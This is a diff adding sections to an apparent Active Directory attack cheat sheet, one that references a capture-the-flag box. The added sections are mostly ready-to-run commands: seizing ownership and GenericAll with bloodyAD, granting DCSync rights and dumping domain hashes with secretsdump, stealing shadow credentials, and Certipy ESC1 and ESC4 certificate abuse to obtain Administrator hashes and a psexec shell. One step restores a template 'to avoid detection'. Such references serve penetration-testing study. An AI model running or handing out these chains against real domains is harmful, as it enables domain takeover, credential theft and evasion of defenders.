@@ -73,6 +73,47 @@ bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
     set password '<victim>' 'NewP@ss123!'
 ```
 
+##### WriteOwner Chain (own → grant → exploit)
+
+`WriteOwner` alone doesn't let you do anything. The pattern is: seize ownership → grant yourself `GenericAll` → then use whatever privileged path the target object opens up (RBCD, Kerberoast, cert request, DCSync).
+
+```bash
+## 1. Take ownership of the target
+bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> set owner <target> <user>
+
+## 2. Grant yourself GenericAll on the now-owned object
+bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> add genericAll <target> <user>
+
+## 3. Whatever the target lets you do
+##    - If <target> is a user with ADCS enrollment rights → certipy shadow to steal its NT hash:
+certipy-ad shadow auto -u <user>@<dom>.local -p '<pass>' -account <target> -dc-ip <dc-ip>
+##    - If <target> is a computer object → RBCD (see below)
+##    - If <target> is a group → add yourself to it
+```
+
+##### WriteDACL → Self DCSync (one-shot)
+
+If you have `WriteDACL` on the *domain object* itself, you can grant yourself the two extended rights that make up DCSync (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`) with one bloodyAD call, then dump the domain.
+
+```bash
+bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
+    add dcsync <user>
+
+impacket-secretsdump -just-dc <dom>/<user>:'<pass>'@<dc-ip>
+```
+
+##### GenericAll on a Group — Add Yourself, Inherit Everything
+
+`GenericAll` on a group means you can `add groupMember` — which means every ACL edge the group holds becomes an edge *you* hold. This is how you chain nested group rights: pop a low-priv user with `GenericAll` on some helpdesk group, add yourself, and now you have whatever the helpdesk group had over the next tier.
+
+```bash
+bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' \
+    add groupMember '<target-group>' <user>
+
+## Then re-run BloodHound / `get writable` from your account to see the new edges
+bloodyAD --host <dc-ip> -d <dom>.local -u <user> -p '<pass>' get writable
+```
+
 ##### Setting a Fake SPN (Targeted Kerberoasting)
 
 ```bash
@@ -93,6 +134,81 @@ bloodyAD -u <user> -p '<pass>' -d <dom>.local --host <dc-ip> \
 impacket-getST -spn cifs/<victim-fqdn> -impersonate Administrator <dom>/'PWN$':'P@ss123'
 export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass <dom>/Administrator@<victim-fqdn>
+```
+
+### ADCS Abuse (Certipy)
+
+If Active Directory Certificate Services is deployed, there's almost always an insta-DA path — enrolling a certificate as a privileged user, then authenticating with the cert to pull that user's NT hash.
+
+**Naming tell:** any account called `ca_svc`, `cert_svc`, `pki_svc`, `enrollment_svc` — that's the CA's operator account and usually holds enroll rights on every template.
+
+#### Find vulnerable templates
+
+```bash
+certipy-ad find -u <user>@<dom>.local -p '<pass>' -dc-ip <dc-ip> -vulnerable -stdout
+
+## Or with an NT hash
+certipy-ad find -u <user>@<dom>.local -hashes <NTLM> -dc-ip <dc-ip> -vulnerable -stdout
+```
+
+#### ESC categories (short)
+
+| ESC | What's wrong | Fix path |
+|-----|--------------|----------|
+| **ESC1** | Template lets requester supply SAN + is set for client auth | Request a cert `-upn Administrator@<dom>` and auth as them |
+| **ESC2** | Template usable as any-purpose (or Enrollment Agent) | Request a cert that authenticates as any user |
+| **ESC3** | Enrollment Agent template + a client-auth template exists | Enrollment Agent → on-behalf-of DA |
+| **ESC4** | You hold write rights over a template | Rewrite it to be ESC1-vulnerable, exploit, restore |
+| **ESC6** | CA has `EDITF_ATTRIBUTESUBJECTALTNAME2` flag set | Any template → supply SAN → ESC1 |
+| **ESC7** | You have `ManageCA` / `ManageCertificates` on the CA itself | Approve your own pending cert / enable the ESC6 flag |
+| **ESC8** | HTTP endpoint of CA + NTLM enabled | NTLM relay coerced auth → get cert |
+| **ESC9/10** | UPN or `msDS-KeyCredentialLink` weirdness | Cert-based hash steal |
+| **ESC16** | Certifried variant on machine account attribute writes | Impersonate a computer, request cert |
+
+#### ESC1 (request cert as Administrator directly)
+
+```bash
+certipy-ad req -u <user>@<dom>.local -p '<pass>' \
+    -ca '<CA-name>' -template '<vuln-template>' \
+    -upn Administrator@<dom>.local -dc-ip <dc-ip>
+
+## Auth with the cert → hash
+certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
+```
+
+#### ESC4 (rewrite → exploit → restore)
+
+```bash
+## Rewrite the target template into an ESC1-vulnerable state
+certipy-ad template -u <user>@<dom>.local -hashes <NTLM> \
+    -template '<template>' -dc-ip <dc-ip> -write-default-configuration
+
+## Now exploit as ESC1
+certipy-ad req -u <user>@<dom>.local -hashes <NTLM> \
+    -ca '<CA-name>' -template '<template>' \
+    -upn Administrator@<dom>.local -dc-ip <dc-ip>
+
+certipy-ad auth -pfx administrator.pfx -dc-ip <dc-ip>
+
+## When done, restore the template's original config to avoid detection
+certipy-ad template -u <user>@<dom>.local -hashes <NTLM> \
+    -template '<template>' -dc-ip <dc-ip> -write-configuration <saved-config>
+```
+
+#### Chain: WriteOwner on ca_svc → ADCS DA
+
+The full path when you land in the middle of a domain (as in EscapeTwo):
+
+```
+low-priv user
+  → WriteOwner on ca_svc
+  → set owner + genericAll on ca_svc         (bloodyAD)
+  → certipy-ad shadow auto → ca_svc NT hash  (steals a shadow credential)
+  → certipy-ad find -vulnerable              (as ca_svc — sees every template)
+  → certipy-ad template ... -write-default-configuration  (ESC4 rewrite)
+  → certipy-ad req -upn Administrator        (ESC1 exploit)
+  → certipy-ad auth -pfx administrator.pfx   → Administrator NT hash
+  → impacket-psexec -hashes :<NTLM> administrator@dc
 ```
 
 ### Mapping BloodHound Edges to Tooling
